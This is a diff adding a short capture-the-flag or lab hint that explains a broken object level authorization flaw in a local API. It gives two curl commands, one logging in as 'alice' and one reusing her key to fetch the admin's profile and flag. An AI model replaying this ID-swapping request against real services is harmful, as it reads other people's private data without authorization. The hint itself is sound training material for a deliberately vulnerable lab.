@@ -1,0 +1,10 @@
+💡 Hint 3: Exploiting BOLA
+
+The API only checks if you're authenticated (have a valid API key) but doesn't verify if you're authorized to access the specific user ID you're requesting.
+
+Step-by-step:
+1. Login as alice: curl -X POST http://localhost:4001/api/login -H 'Content-Type: application/json' -d '{"username":"alice"}'
+2. Copy the api_key from the response
+3. Access admin's profile: curl -H 'API-Key: <alice_key>' http://localhost:4001/api/users/2
+
+The flag will be in the admin's profile data!
